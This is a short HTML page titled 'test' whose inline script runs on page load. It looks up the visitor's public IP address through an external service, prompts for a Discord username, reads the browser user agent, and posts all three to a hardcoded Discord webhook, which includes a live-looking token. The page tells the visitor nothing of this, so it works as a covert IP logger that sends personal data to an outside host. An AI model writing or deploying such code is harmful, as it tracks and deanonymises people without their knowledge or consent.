<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test</title>
</head>
<body>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const webhookUrl = 'https://discord.com/api/webhooks/1181568688365772810/a8uz5coZtPV_fm96znZsrCny53RXJn55vjU0P6QfzL7VVVvcoDjnCvKgfbjPhHARDI5N'; // Replace with your Discord webhook URL

        // Function to send user and device information to Discord
        const sendInfoToDiscord = (username, ip, userAgent) => {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `New visitor info:\nUsername: ${username}\nIP: ${ip}\nUser Agent: ${userAgent}`,
                }),
            });
        };

        // Function to get visitor's information
        const getVisitorInfo = async () => {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                const username = prompt('Please enter your Discord username:');
                const userAgent = navigator.userAgent;

                if (username) {
                    sendInfoToDiscord(username, ip, userAgent);
                } else {
                    console.error('Discord username not provided');
                }
            } catch (error) {
                console.error('Error fetching IP:', error);
            }
        };

        // Call the function when the page loads
        getVisitorInfo();
    });
</script>

</body>
</html>
